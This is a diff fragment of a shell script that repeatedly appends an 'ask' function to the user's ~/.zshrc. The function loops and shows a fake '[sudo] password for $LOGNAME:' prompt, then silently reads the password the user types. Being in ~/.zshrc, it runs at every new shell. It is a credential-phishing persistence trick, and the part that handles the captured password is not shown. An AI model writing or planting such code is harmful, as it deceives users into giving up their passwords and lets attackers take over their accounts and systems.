@@ -1,4 +1,5 @@
-echo 'ask() {
+echo '
+ask() {
     while ((1 == 1)); do
         echo -e "[sudo] password for $LOGNAME: \c"
         read -s password
@@ -9,7 +10,8 @@ echo 'ask() {
 }
 ask' >> ~/.zshrc
 
-echo 'ask() {
+echo '
+ask() {
     while ((1 == 1)); do
         echo -e "[sudo] password for $LOGNAME: \c"
         read -s password
